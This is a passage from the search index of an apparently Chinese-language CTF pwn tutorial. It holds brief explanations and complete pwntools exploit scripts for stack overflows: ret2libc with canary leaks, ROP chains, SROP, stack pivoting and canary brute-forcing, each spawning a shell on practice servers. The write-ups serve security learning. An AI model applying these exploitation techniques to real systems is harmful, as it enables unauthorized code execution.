remote('node3.buuoj.cn',26842)\nelf = ELF('./bjdctf_2020_babyrop2')\n\npayload = '%7$p'\n\nr.sendline(payload)\nr.recvuntil('0x')\n\ncancry = int(r.recv(16),16)\n\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x0400993\nmain_addr = elf.symbols['main']\nvuln_addr = 0x0400887\n\n# 'a' * (0x20 - 8) + p64(cancry)\uff1a\u7ed5\u8fc7 cancry\n# p64(0)\uff1a\u8986\u76d6 ebp\npayload = b'a' * (0x20 - 8) + p64(cancry) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)\n\nr.recvuntil('story!\\n')\nr.sendline(payload)\n\nputs_addr = u64(r.recv(6).ljust(8, b'\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nbase_addr = puts_addr - libc.dump('puts')\nsystem_addr = base_addr + libc.dump('system')\nshell_addr = base_addr + libc.dump('str_bin_sh')\n\nr.recvuntil('story!\\n')\n\npayload = b'a' * (0x20 - 8) + p64(cancry) + p64(0) + p64(pop_rdi) + p64(shell_addr) + p64(system_addr) + p64(main_addr)\n\nr.sendline(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-13/","title":"ROPgadget ROP","text":""},{"location":"Pwn/Chapter1/1-13/#ropgadget-rop","title":"ROPgadget ROP","text":"<p>\u5148 checksec</p> <p> </p> <p>\u53d1\u73b0\u662f Gets \u6ea2\u51fa</p> <p></p> <p>\u8ddd\u79bb r \u5dee 16 \u5b57\u8282</p> <p></p> <p>\u6ca1\u6709\u53ef\u5229\u7528\u5b57\u7b26\u4e32\u4ee5\u53ca\u6cc4\u9732 libc \u7684\u51fd\u6570</p> <p></p> <p>\u5229\u7528\u4e86\u5de5\u5177 ROPgadget\uff0c\u5b83\u6709\u4e00\u4e2a\u529f\u80fd\uff0c\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u7247\u6bb5\u62fc\u51d1 rop \u94fe</p> <pre><code>ROPgadget --binary '/home/suc2es2/Pwn_shell/rop' --ropchain\n</code></pre> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\nfrom struct import pack\n\nr=remote('node5.buuoj.cn',27427)\n\ndef payload():\n    p = b'a' * 16\n    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret\n    p += pack('&lt;I', 0x080ea060) # @ .data\n    p += pack('&lt;I', 0x080b8016) # pop eax ; ret\n    p += b'/bin'\n    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret\n    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret\n    p += pack('&lt;I', 0x080ea064) # @ .data + 4\n    p += pack('&lt;I', 0x080b8016) # pop eax ; ret\n    p += b'//sh'\n    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret\n    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret\n    p += pack('&lt;I', 0x080ea068) # @ .data + 8\n    p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret\n    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret\n    p += pack('&lt;I', 0x080481c9) # pop ebx ; ret\n    p += pack('&lt;I', 0x080ea060) # @ .data\n    p += pack('&lt;I', 0x080de769) # pop ecx ; ret\n    p += pack('&lt;I', 0x080ea068) # @ .data + 8\n    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret\n    p += pack('&lt;I', 0x080ea068) # @ .data + 8\n    p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret\n    p += pack('&lt;I', 0x0806c943) # int 0x80\n    return p\n\nshell = payload()\n\nr.sendline(shell)\nr.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-14/","title":"int 0x80 ROP","text":""},{"location":"Pwn/Chapter1/1-14/#int-0x80-rop","title":"int 0x80 ROP","text":"<p>\u5148 checksec \u4e00\u4e0b</p> <p></p> <p>\u9996\u5148\u4f7f\u7528 cyclic \u751f\u6210\u968f\u673a\u5b57\u7b26</p> <p></p> <p>\u7136\u540e dbg \u7a0b\u5e8f run \u8d77\u6765\u8f93\u5165\u5b57\u7b26</p> <p></p> <p><code>cyclic -l</code> \u6d4b\u51fa\u504f\u79fb</p> <p></p> <p>\u67e5\u770b\u6709\u4ec0\u4e48\u53ef\u5229\u7528\u7684</p> <p></p> <p>\u7ed9\u51fa\u4e86 <code>int 0x80</code> \u7cfb\u7edf\u8c03\u7528\uff0c\u6211\u4eec\u9700\u8981\u8c03\u7528 eax\u3001ebx\u3001ecx\u3001edx \u5bc4\u5b58\u5668\uff0c\u53bb\u627e\u627e</p> <p></p> <p></p> <p>\u63a5\u4e0b\u6765\u662f\u53c2\u6570 binsh \u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a\u6ca1\u6709\u7ed9\u51fa\u6240\u4ee5\u53ea\u80fd\u81ea\u5df1\u8f93\u5165</p> <p>\u8c03\u7528 read() \u51fd\u6570\u5c06 binsh \u5b57\u7b26\u4e32\u5199\u5165 bss \u6bb5\u76f4\u63a5\u8c03\u7528</p> <p>\u800c\u4e14\u8fd9\u9053\u9898\u6ca1\u6709\u5f00\u542f pie\uff0cbss \u7684\u5730\u5740\u5c31\u662f\u7edd\u5bf9\u5730\u5740</p> <p></p> <p>\u9996\u5148\u8df3\u8f6c\u5230 read() \u51fd\u6570\uff0c\u8fd4\u56de\u5730\u5740\u4e3a p32(pop_edx_ecx_ebx)</p> <pre><code># p32(0)\uff1aread \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 fd\uff0c\u8bbe\u7f6e\u4e3a 0\uff08\u6807\u51c6\u8f93\u5165\uff09\n# p32(binsh_addr)\uff1aread \u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 buf\uff0c\u8bbe\u7f6e\u4e3a /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740\n# p32(0x8)\uff1aread \u51fd\u6570\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570 count\uff0c\u8bbe\u7f6e\u4e3a 8\uff0c\u8868\u793a\u8bfb\u53d6 8 \u4e2a\u5b57\u8282\npayload = 'a' * 0x20 + p32(read_addr) + p32(pop_pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)\n</code></pre> <p>\u7136\u540e\u8c03\u7528 <code>int 0x80</code></p> <pre><code># p32(pop_eax)\uff1aread \u51fd\u6570\u8fd4\u56de\u540e\uff0c\u8df3\u8f6c\u5230 pop eax; ret\uff0c\u7528\u4e8e\u8bbe\u7f6e eax \u5bc4\u5b58\u5668\u7684\u503c\n# p32(0xb)\uff1a\u5c06 0xb \u5f39\u51fa\u5230 eax \u5bc4\u5b58\u5668\uff0c0xb \u662f execve \u7cfb\u7edf\u8c03\u7528\u7684\u7f16\u53f7\n# p32(pop_edx_ecx_ebx)\uff1a\u8df3\u8f6c\u5230 pop edx; pop ecx; pop ebx; ret\uff0c\u7528\u4e8e\u8bbe\u7f6e execve \u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\n# p32(0)\uff1aexecve \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 edx\uff0c\u8bbe\u7f6e\u4e3a 0\n# p32(0)\uff1aexecve \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 ecx\uff0c\u8bbe\u7f6e\u4e3a 0\n# p32(binsh_addr)\uff1aexecve \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570 ebx\uff0c\u8bbe\u7f6e\u4e3a /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740\n# p32(int_addr)\uff1a\u8df3\u8f6c\u5230 int 0x80\uff0c\u89e6\u53d1\u7cfb\u7edf\u8c03\u7528\uff0c\u6267\u884c execve(\"/bin/sh\", 0, 0)\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a shell\npayload += p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_addr)\n</code></pre> <pre><code>from pwn import *\n\np = remote(\"node5.buuoj.cn\", 29550)\n\npop_ecx_ebx = 0x0806e850\npop_eax = 0x080bae06\nint_addr = 0x080493e1\nread_addr = 0x0806CD50\nbin_addr = 0x080EB584\n\np.recv()\n\npayload = b'a' * 0x20 + p32(read_addr) + p32(pop_ecx_ebx) + p32(0) + p32(bin_addr) + p32(0x8)\npayload += p32(pop_eax) + p32(0xb) + p32(pop_ecx_ebx) + p32(0) + p32(0) + p32(bin_addr) + p32(int_addr)\n\np.sendline(payload)\np.send(b\"/bin/sh\\x00\")\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-15/","title":"Call system ROP","text":""},{"location":"Pwn/Chapter1/1-15/#call-system-rop","title":"Call system ROP","text":"<p>\u5b58\u5728 read \u6808\u6ea2\u51fa</p> <p></p> <p>\u53ef\u5229\u7528\u5b57\u8282\u6570\u53ea\u6709 12 \u4e2a\uff0c\u6ca1\u6cd5\u5229\u7528 plt \u5730\u5740\u4e86\uff0c\u56e0\u4e3a plt \u5730\u5740\u9700\u8981\u8fd4\u56de\u503c</p> <p></p> <p>\u4f7f\u7528 <code>call system</code> \u6765\u8c03\u7528 <code>system</code>\uff0c<code>call</code> \u51fd\u6570\u4e0d\u7528\u8fd4\u56de\u503c\u4e86\uff0c\u5b83\u4f1a\u81ea\u5df1\u628a\u4e0b\u4e00\u6761\u6307\u4ee4\u7ed9\u538b\u8fdb\u53bb</p> <p></p> <p>\u627e\u53ef\u7528\u5b57\u7b26\u4e32</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import*\n\np = remote('node5.buuoj.cn',27415)\n\npayload = b'a' * 28 + p32(0x08048529) + p32(0x08048670)\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-16/","title":"Pwndbg \u52a8\u6001\u8c03\u8bd5\u504f\u79fb","text":""},{"location":"Pwn/Chapter1/1-16/#pwndbg-\u52a8\u6001\u8c03\u8bd5\u504f\u79fb","title":"Pwndbg \u52a8\u6001\u8c03\u8bd5\u504f\u79fb","text":"<p>\u5f00\u5c40\u4e00\u4e2a\u8f93\u5165</p> <p></p> <p>\u540e\u95e8\u51fd\u6570\u4e5f\u7ed9\u51fa\u4e86</p> <p></p> <p>\u53cc\u51fb &amp;v4 \u8df3\u8f6c\u5230\u4e86 0c \u8fd9\u91cc</p> <p></p> <p>\u6309\u7167\u6b63\u5e38\u7684\u601d\u8def\u7684\u8bdd\u6ea2\u51fa <code>0x0c + 4</code> \u5b57\u8282\u5373\u53ef\uff0c\u4f46\u5b9e\u9645\u4e0a\u6253\u4e0d\u901a\u8fdc\u7a0b</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',29379)\n\nflag = 0x0804856D\n\npayload = b'a' * 16 + p32(flag)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p></p> <p>\u8fd9\u79cd\u60c5\u51b5\u5c31\u662f IDA \u4e5f\u4e0d\u77e5\u9053 v4 \u4e00\u5f00\u59cb\u4f4d\u7f6e\u5728\u54ea</p> <p>\u53c2\u7167\u4e4b\u524d\u7684\u4e00\u4e9b\u6808\u6ea2\u51fa\uff0c\u8981\u4e48\u660e\u663e\u6807\u51fa\u8d77\u59cb\u4f4d\u8981\u4e48\u5c31\u662f\u8d77\u59cb\u4f4d</p> <p>\u4f7f\u7528 cyclic \u751f\u6210\u968f\u673a\u5b57\u7b26</p> <p></p> <p>\u7136\u540e dbg \u4e2d run \u7a0b\u5e8f\u8f93\u5165\u5b57\u7b26</p> <p>\u56e0\u4e3a\u6570\u636e\u8fc7\u591a\u5bfc\u81f4\u7a0b\u5e8f\u9519\u8bef\u4f1a\u6682\u505c</p> <p></p> <p>\u4f7f\u7528 <code>cyclic -l 0x61616167</code> \u8ba1\u7b97\u504f\u79fb\u5f97\u51fa 24</p> <p></p> <p>\u4fee\u6539 payload \u504f\u79fb</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',29379)\n\nflag = 0x0804856D\n\npayload = b'a' * 24 + p32(flag)\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-17/","title":"\u62a5\u9519\u53c2\u6570\u6eaf\u6e90","text":""},{"location":"Pwn/Chapter1/1-17/#\u62a5\u9519\u53c2\u6570\u6eaf\u6e90","title":"\u62a5\u9519\u53c2\u6570\u6eaf\u6e90","text":"<p>\u4e00\u5f00\u59cb\u5c31\u7ed9\u51fa\u4e86\u8d26\u53f7\u5bc6\u7801\uff0c\u4f46\u662f\u6ca1\u4ec0\u4e48\u7528</p> <p></p> <p>\u5728 gdb \u4e2d\u8c03\u8bd5\u53d1\u73b0\u6700\u540e\u62a5\u9519\u4e86</p> <p></p> <p>\u5012\u7740\u770b main \u51fd\u6570\u53bb\u8ddf\u8e2a\u6700\u540e\u4e00\u4e2a password_checker</p> <p></p> <p>\u56de\u770b\u4e4b\u524d run \u7684\u65f6\u5019\u6253\u5370\u7684\u8bed\u53e5\u5bf9\u7684\u4e0a</p> <p></p> <p>\u6253\u5370\u4e86\u4e24\u53e5\u7136\u540e\u62a5\u9519\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u5728 <code>(**a1)();</code> \u4e0a</p> <p>\u67e5\u770b\u5176\u6c47\u7f16\u53d1\u73b0\u662f <code>call rax</code> \u5f53\u4f5c\u51fd\u6570\u6267\u884c\u4e86</p> <p></p> <p>\u56de\u6eaf rax \u7684\u503c\u5230\u4e86 rdi</p> <p></p> <p>\u7ee7\u7eed\u53bb\u4e3b\u51fd\u6570\u4e2d\u627e rdi \u7684\u503c\u53c8\u56de\u5230\u4e86 rax \u4e2d\uff0c\u5728\u8fd9\u4e4b\u524d\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u8ddf\u8fdb\u53bb\u770b\u770b</p> <p></p> <p>\u53c8\u662f\u53d6\u4e86\u4e2a\u5730\u5740\u7ed9 rax</p> <p></p> <p>\u89e3\u6790\u4f2a\u4ee3\u7801\u5c31\u662f v2</p> <p></p> <p>\u53bb\u770b\u770b v2 \u7684\u6808</p> <p></p> <p>\u7ed9\u51fa\u4e86\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u5728 read_password \u4e2d\u8bfb\u53d6\u4e86\u8f93\u5165\u5230 s \u4e2d</p> <p></p> <p>\u67e5\u770b\u7f13\u51b2\u533a\u53d1\u73b0\u80fd\u8986\u76d6 v2 \u7684\u503c</p> <p></p> <p>\u6700\u540e\u8fd8\u8c03\u7528\u4e86 snprintf() \u51fd\u6570\uff0c\u4f7f\u7528 <code>\\x00</code> \u622a\u65ad</p> <p></p> <p>\u6784\u9020 payloiad</p> <pre><code>from pwn import *\n\nr = remote('node5.buuoj.cn',29677)\n\nbackdoor = 0x400e88\n\nr.sendlineafter(': ',b'admin')\nr.sendlineafter(': ',b'2jctf_pa5sw0rd' + b'\\x00' * 0x3a + p64(backdoor))\n\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-18/","title":"64 \u4f4d\u6808\u8fc1\u79fb ret \u6ed1\u68af","text":""},{"location":"Pwn/Chapter1/1-18/#64-\u4f4d\u6808\u8fc1\u79fb-ret-\u6ed1\u68af","title":"64 \u4f4d\u6808\u8fc1\u79fb ret \u6ed1\u68af","text":"<p>\u53cd\u7f16\u8bd1\u53ea\u591f\u6ea2\u51fa 0x10\uff0c\u7b2c\u4e8c\u4e2a read \u653e\u5230\u4e86 bss \u6bb5</p> <p></p> <p>\u9996\u5148\u5229\u7528 pit \u8868\u4e2d\u7684 puts \u51fd\u6570\u6cc4\u9732 libc\uff0c\u5f97\u5148\u627e <code>pop rdi</code> \u6307\u4ee4</p> <p></p> <p>\u5176\u6b21\u6808\u8fc1\u79fb\u9700\u8981 leave \u6307\u4ee4</p> <p></p> <p>\u5148\u6784\u9020 payload \u8fc1\u79fb\u6808\u5230 bss \u6bb5</p> <pre><code>r.recvuntil('u want')\n\npayload = b'a' * 0x60 + p64(bank_addr) + p64(leave)\n\nr.send(payload)\n</code></pre> <p>\u7b2c\u4e00\u6b21\u6ea2\u51fa</p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u4e0d\u80fd\u5c06\u6808\u8fc1\u79fb\u5230\u53d8\u91cf bank \u7684\u5f00\u5934\uff0c\u56e0\u4e3a\u540e\u9762\u8fd8\u9700\u8981\u8c03\u7528 puts \u7b49\u51fd\u6570\uff0c\u5f80\u4e0a\u53ef\u80fd\u4f1a\u8986\u76d6\u67d0\u4e9b\u91cd\u8981\u6570\u636e\uff0c\u56e0\u6b64\u8fc1\u79fb\u7684\u5730\u5740\u5e94\u8be5\u5c3d\u91cf\u9760\u540e</p> <p>bank \u7684\u5730\u5740\u8ddd\u79bb got \u8868\u5f88\u8fd1\uff0c\u53ea\u9694\u7740 0x30 \u7684\u8ddd\u79bb\uff0c\u800c\u8c03\u7528 puts \u5f88\u5403\u6808\u7a7a\u95f4\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u505a\u6808\u8fc1\u79fb\u7684\u65f6\u5019\u8981\u628a\u5730\u5740\u76f8\u5bf9\u7684\u62ac\u9ad8\u4e9b</p> <p></p> <p>\u518d\u627e\u627e ret \u6307\u4ee4\uff0c\u76f8\u5f53\u4e8e</p> <pre><code>pop eip # \u7ed9 eip \u8d4b\u503c\n</code></pre> <p></p> <p>\u4e4b\u540e\u518d\u5728 bss \u6bb5\u4e2d\u6784\u9020\u6cc4\u9732 libc \u7684 payload</p> <p>\uff08\u53ea\u8981 p64(ret) * num \u4e2d 28 &gt;= num &gt;= 20 \u5373\u53ef\uff09</p> <pre><code>r.recvuntil('now!')\n\npayload = p64(ret) * 21 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\nr.send(payload)\nr.recvline()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n</code></pre> <p>\u4e4b\u540e\u5c31\u662f libc \u57fa\u5740\u4e86</p> <pre><code>libc = LibcSearcher('puts', pus_addr)\nlibc_base = pus_addr - libc.dump('puts')\n</code></pre> <p>\u4f46\u662f\u8fd9\u9898\u4e0d\u80fd ROP\uff0c\u53ea\u80fd one_gadget\uff08\u53ef\u80fd\u662f\u7a7a\u95f4\u4e0d\u591f\uff09</p> <p></p> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = remote('node5.buuoj.cn',26424)\n# r = process('./gyctf_2020_borrowstack')\n\nelf = ELF('./gyctf_2020_borrowstack')\nbank_addr = 0x0601080\nleave = 0x400699\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x400703\nmain = 0x0400626\nret = 0x4004c9\n\nr.recvuntil('u want')\n\npayload = b'a' * 0x60 + p64(bank_addr) + p64(leave)\n\nr.send(payload)\nr.recvuntil('now!')\n\npayload = p64(ret) * 28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\nr.send(payload)\nr.recvline()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts',puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\n\none_gadget = libc_base + 0x4526a\n\npayload = b'a' * (0x60 + 8) + p64(one_gadget)\n\nr.send(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-19/","title":"Sigreturn ROP","text":""},{"location":"Pwn/Chapter1/1-19/#sigreturn-rop","title":"Sigreturn ROP","text":"<p>\u53cd\u7f16\u8bd1\u4ee3\u7801</p> <p></p> <p>\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u5b58\u5728\u6808\u6ea2\u51fa</p> <p></p> <p>\u7ed9\u4e86\u5b57\u7b26\u4e32</p> <p></p> <p>\u67e5\u627e <code>pop rdi</code> \u6ca1\u6709\u627e\u5230</p> <p></p> <p>\u57fa\u7840\u914d\u7f6e</p> <pre><code>from pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug')\np = remote(\"challenge.qsnctf.com\", 31213)\nbinsh = 0x40203A\nrsi_rax_ret = 0x401049\nsyscall_ret = 0x401045\n</code></pre> <p>\u6784\u9020 SROP Frame</p> <pre><code>frame = SigreturnFrame()\nframe.rax = constants.SYS_execve    # execve\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\uff0859\uff09\nframe.rdi = binsh                  # \"/bin/sh\" \u5730\u5740\nframe.rsi = 0                      # argv\u53c2\u6570\uff08NULL\uff09\nframe.rdx = 0                      # envp\u53c2\u6570\uff08NULL\uff09\nframe.rip = syscall_ret             # \u7cfb\u7edf\u8c03\u7528\u540e\u8df3\u8f6c\u5230 syscall; ret\n</code></pre> <p>\u6784\u9020 payload</p> <pre><code>payload = b'a' * 8 + p64(rsi_rax_ret) + p64(0) + p64(0xf) + p64(syscall_ret) + bytes(frame)\n</code></pre> <p>\u653b\u51fb\u6d41\u7a0b\uff1a</p> <ol> <li>\u6808\u6ea2\u51fa\uff1a\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230 <code>rsi_rax_ret</code></li> <li>\u8bbe\u7f6e <code>rsi=0</code> \u548c <code>rax=0xf</code>\uff1a</li> <li><code>pop rsi</code> \u2192 <code>rsi = 0</code>\uff08<code>execve</code> \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 <code>argv</code>\uff08\u53c2\u6570\u6570\u7ec4\uff09\u8bbe\u4e3a <code>NULL</code>\uff08\u5373 <code>0</code>\uff09\uff0c\u8868\u793a\u65e0\u989d\u5916\u53c2\u6570\uff09</li> <li><code>pop rax</code> \u2192 <code>rax = 0xf</code> \uff08<code>0xf</code> \u662f <code>sigreturn</code> \u7684\u7cfb\u7edf\u8c03\u7528\u53f7\uff08<code>__NR_rt_sigreturn</code>\uff09\uff0c\u5f53 <code>syscall</code> \u6267\u884c\u65f6\uff0c<code>rax</code> \u51b3\u5b9a\u8c03\u7528\u54ea\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u8fd9\u91cc\u89e6\u53d1 <code>sigreturn</code>\uff09</li> <li>\u6267\u884c <code>syscall</code>\uff1a</li> <li><code>syscall</code> \u89e6\u53d1 <code>sigreturn</code></li> <li><code>sigreturn</code> \u4ece\u6808\u4e0a\u8bfb\u53d6 <code>frame</code>\uff0c\u6062\u590d\u6240\u6709\u5bc4\u5b58\u5668\uff1a<ul> <li><code>rax = 59</code>\uff08<code>execve</code>\uff09</li> <li><code>rdi = binsh</code>\uff08<code>\"/bin/sh\"</code>\uff09</li> <li><code>rsi = 0</code>, <code>rdx = 0</code>\uff08\u65e0\u53c2\u6570\uff09</li> <li><code>rip = syscall_ret</code>\uff08\u518d\u6b21\u6267\u884c <code>syscall</code>\uff09</li> </ul> </li> <li>\u7b2c\u4e8c\u6b21 <code>syscall</code>\uff1a</li> <li>\u7531\u4e8e <code>rax=59</code>\uff0c\u89e6\u53d1 <code>execve(\"/bin/sh\", NULL, NULL)</code>\uff0c\u83b7\u5f97 shell</li> </ol> <pre><code>from pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug')\np = remote(\"challenge.qsnctf.com\", 31213)\nbinsh = 0x40203A\nrsi_rax_ret = 0x401049\nsyscall_ret = 0x401045\n\nframe = SigreturnFrame()\nframe.rax = constants.SYS_execve\nframe.rdi = binsh\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = syscall_ret\n\npayload = b'a' * 8 + p64(rsi_rax_ret) + p64(0) + p64(0xf) + p64(syscall_ret) + bytes(frame)\n\np.sendafter(\"now seems extraordinary.\\n\", payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-2/","title":"Gets \u6808\u6ea2\u51fa\uff08\u5806\u6808\u5e73\u8861\uff09","text":""},{"location":"Pwn/Chapter1/1-2/#gets-\u6808\u6ea2\u51fa\u5806\u6808\u5e73\u8861","title":"Gets \u6808\u6ea2\u51fa\uff08\u5806\u6808\u5e73\u8861\uff09","text":"<p>IDA64 \u53cd\u7f16\u8bd1</p> <p></p> <p>\u53bb\u627e\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u8bb0\u5f55\u5730\u5740</p> <p></p> <p>\u7f13\u51b2\u533a s \u5b58\u5728\u660e\u663e\u6808\u6ea2\u51fa</p> <p></p> <p>15 + 8 \u8986\u76d6\u6389\u8fd9\u6bb5\u5730\u5740\u5230 r \u8fd4\u56de\u5730\u5740\u4e2d</p> <p>64 \u4f4d\u7cfb\u7edf\u8fd8\u9700\u8981\u4fdd\u6301\u4e00\u4e2a\u6808\u5e73\u8861\uff0c\u9700\u8981\u627e lea \u7684\u5730\u5740\u6216\u8005\u8be5\u51fd\u6570\u7ed3\u675f\u5373 retn \u7684\u5730\u5740</p> <p>\u5f53\u6211\u4eec\u5728\u5806\u6808\u4e2d\u8fdb\u884c\u5806\u6808\u7684\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u4fdd\u8bc1\u5728 ret \u8fd9\u6761\u6307\u4ee4\u4e4b\u524d</p> <p>esp \u6307\u5411\u7684\u662f\u6211\u4eec\u538b\u5165\u6808\u4e2d\u7684\u5730\u5740\uff0c\u51fd\u6570\u6267\u884c\u5230 ret \u6267\u884c\u4e4b\u524d\uff0c\u5806\u6808\u6808\u9876\u7684\u5730\u5740\u4e00\u5b9a\u8981\u662f call \u6307\u4ee4\u7684\u4e0b\u4e00\u4e2a\u5730\u5740</p> <p></p> <p>\u7f16\u5199\u811a\u672c</p> <pre><code>from pwn import *\n\np = remote(\"node5.buuoj.cn\", 26964)\n\npayload = b'a' * 23 + p64(0x401198) + p64(0x401186)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-20/","title":"\u9010\u5b57\u8282\u679a\u4e3e Canary","text":""},{"location":"Pwn/Chapter1/1-20/#\u9010\u5b57\u8282\u679a\u4e3e-canary","title":"\u9010\u5b57\u8282\u679a\u4e3e Canary","text":"<p>\u6709\u5f00\u542f\u91d1\u4e1d\u96c0</p> <p> </p> <p>\u660e\u663e\u5b58\u5728\u6808\u6ea2\u51fa</p> <p></p> <p>\u786e\u5b9a\u6ea2\u51fa\u5927\u5c0f</p> <p></p> <p>\u56e0\u4e3a <code>fork()</code> \u4e4b\u540e\u7684 <code>canary</code> \u662f\u4e0d\u53d8\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u8003\u8651\u7206\u7834</p> <pre><code># \u521d\u59cb canary = b'\\x00'\uff08Canary \u6700\u9ad8\u5b57\u8282\u56fa\u5b9a\u4e3a 0\uff09\ncanary = b'\\x00'\n\n# \u5783\u573e\u6570\u636e\npadding = b'a' * (0x110 - 0x8)\n\n# \u5916\u5c42 7 \u6b21\u5faa\u73af\u4f9d\u6b21\u6062\u590d\u5269\u4f59 7 \u5b57\u8282\nfor i in range(7):\n  # \u5185\u5c42\u679a\u4e3e 0x00\u20130xFF\n  for j in range(0x100):\n    # \u53d1\u9001 padding + \u5df2\u77e5\u7684 canary \u524d\u7f00 + \u731c\u6d4b\u5b57\u8282\n    payload = padding + canary + p8(j)\n    p.sendafter(b'input:\\n', payload)\n\n    # \u89c2\u5bdf\u8fdb\u7a0b\u662f\u5426\u89e6\u53d1 \"stack smashing detected\" \u5f02\u5e38\n    strs = p.recvuntil(b'*** stack smashing detected ***', timeout=1)\n\n    # \u5982\u679c\u672a\u89e6\u53d1\uff0c\u8bf4\u660e\u731c\u6d4b\u5b57\u8282\u6b63\u786e\uff0c\u8ffd\u52a0\u5230 canary\uff0c\u7ee7\u7eed\u4e0b\u4e00\u4e2a\u5b57\u8282\n    if (b'stack' not in strs):\n      canary += p8(j)\n      break\n</code></pre> <p></p> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import*\nfrom struct import pack\n\np = remote('challenge.qsnctf.com',32000)\nFILENAME = './pwn'\n# p=process(FILENAME)\n# elf=ELF(FILENAME)\n# p=gdb.debug(FILENAME,'b* 0x08049422')\n# gdb.attach(p,'b* 0x4011B9')\n\ndef sh():\n# Padding goes here\n  p = b''\n  p += pack('&lt;Q', 0x000000000040f23e) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004c10e0) # @ .data\n  p += pack('&lt;Q', 0x00000000004493d7) # pop rax ; ret p += b'/bin//sh'\n  p += pack('&lt;Q', 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x000000000040f23e) # pop rsi ; ret\n  p += pack('&lt;Q', 0x00000000004c10e8) # @ .data + 8\n  p += pack('&lt;Q', 0x00000000004437a0) # xor rax, rax ; ret\n  p += pack('&lt;Q', 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x00000000004018c2) # pop rdi ; ret\n  p += pack('&lt;Q', 